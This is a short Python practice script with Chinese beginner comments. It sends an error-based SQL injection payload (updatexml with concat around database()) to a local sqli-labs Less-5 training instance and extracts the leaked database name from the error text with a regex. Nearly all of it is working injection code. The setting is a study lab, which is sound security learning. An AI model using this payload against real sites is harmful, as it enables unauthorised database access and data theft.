import requests#1.0版本运行成功了啊也是，requests是最基本的web函数库
import re#ok啊一个一个导入，现在是2.0版本

#URL和Payload拼接一下
URL="http://127.0.0.1/sqli-labs-master/Less-5/"
Payload="?id=1' and updatexml(1,concat(0x7e,database(),0x7e),3)--+"

a=requests.get(URL+Payload)#ok啊这个a就是完整的URL，用get交互一下

# print(a.text)#直接把网页源码返回给我了，这个a.text是什么，为什么变量后面可以加.

# b=re.search()#这个地方格式有点复杂，先留着待会写一个只留关键内容的


b=re.search(r"error:\s*'~(.*?)~'",a.text)
#b=re.search("error:\s*'~(.*?)~'",a.test)

if b:
    print(b.group(1))#非常好啊这个就是我们的库名了




